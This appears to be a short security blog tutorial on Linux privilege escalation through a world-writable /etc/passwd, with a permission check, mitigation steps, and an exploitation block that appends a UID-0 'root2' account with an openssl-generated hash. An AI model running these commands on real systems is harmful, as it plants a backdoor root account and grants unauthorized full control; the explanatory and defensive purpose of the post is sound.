---
title: Exploiting Writable /etc/passwd for Root Access
description: Understanding how writable /etc/passwd can lead to privilege escalation
author: drewbyte
date: 2023-04-10 00:00:00 +0800
categories: [linux, privilege-escalation]
tags: [privesc, linux, passwd, misconfiguration]
image:
  path: /assets/img/writeable.jpg
  alt: img
pin: true
---

> **Writable /etc/passwd = Instant Privilege Escalation**
{: .box-danger }

One of the most classic and dangerous Linux misconfigurations is having a writable `/etc/passwd` file.
If a low-privileged user is able to write to this file, it can directly lead to **root access**.

---

## Checking if `/etc/passwd` is Writable

To verify the permissions of the file, use:

```bash
ls -la /etc/passwd
```

Example Output:
```bash
-rw-rw-rw- 1 root root 1342 Jan 10 12:00 /etc/passwd
```

Explanation:
```bash
-rw-rw-rw-
Owner (root) → read & write
Group → read & write
Others → read & write 
```
👉 The last rw- means any user on the system can modify the file, which is a critical vulnerability.

## Exploitation
```bash
openssl passwd Passw0rd
<HASH>

echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
Password: Passw0rd
```

## Mitigation
- Ensure correct permissions:
```bash
chmod 644 /etc/passwd
```

- Ensure proper ownership:
```bash
chown root:root /etc/passwd
```
Tip: Always check sensitive files like `/etc/passwd` during privilege escalation — a single misconfiguration can lead to full system compromise.
{: .prompt-info }